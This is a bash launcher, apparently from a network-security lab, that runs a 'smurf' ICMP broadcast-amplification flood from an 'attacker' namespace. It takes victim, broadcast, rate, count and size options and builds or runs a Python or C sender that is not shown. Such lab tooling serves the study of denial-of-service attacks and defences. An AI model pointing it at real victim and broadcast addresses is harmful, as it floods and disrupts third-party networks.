#!/usr/bin/env bash
# run_attack.sh — launch the hand-crafted sender inside the attacker namespace.
#
#   sudo bash run_attack.sh [--engine py|c] [--count N] [--rate PPS] [--size B]
#                           [--victim IP] [--broadcast IP]
#
# Defaults come from lab.env (victim=$VICTIM_IP, broadcast=$AMP_BCAST).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lab.env
source "$SCRIPT_DIR/lab.env"

if [ "$(id -u)" -ne 0 ]; then exec sudo -E bash "$0" "$@"; fi

ENGINE=py
COUNT=100
RATE=50
SIZE=0
VICTIM="$VICTIM_IP"
BCAST="$AMP_BCAST"

while [ $# -gt 0 ]; do
  case "$1" in
    --engine)    ENGINE="$2"; shift 2;;
    --count)     COUNT="$2";  shift 2;;
    --rate)      RATE="$2";   shift 2;;
    --size)      SIZE="$2";   shift 2;;
    --victim)    VICTIM="$2"; shift 2;;
    --broadcast) BCAST="$2";  shift 2;;
    *) echo "unknown option: $1" >&2; exit 2;;
  esac
done

case "$ENGINE" in
  py)
    ip netns exec attacker python3 "$SCRIPT_DIR/src/smurf.py" \
      --victim "$VICTIM" --broadcast "$BCAST" \
      --count "$COUNT" --rate "$RATE" --size "$SIZE"
    ;;
  c)
    BIN="$SCRIPT_DIR/src/smurf"
    if [ ! -x "$BIN" ] || [ "$SCRIPT_DIR/src/smurf.c" -nt "$BIN" ]; then
      echo "[*] Building smurf.c ..."
      gcc -O2 -Wall -o "$BIN" "$SCRIPT_DIR/src/smurf.c"
    fi
    ip netns exec attacker "$BIN" "$VICTIM" "$BCAST" "$RATE" "$COUNT" "$SIZE"
    ;;
  *)
    echo "unknown engine: $ENGINE (use py or c)" >&2; exit 2;;
esac
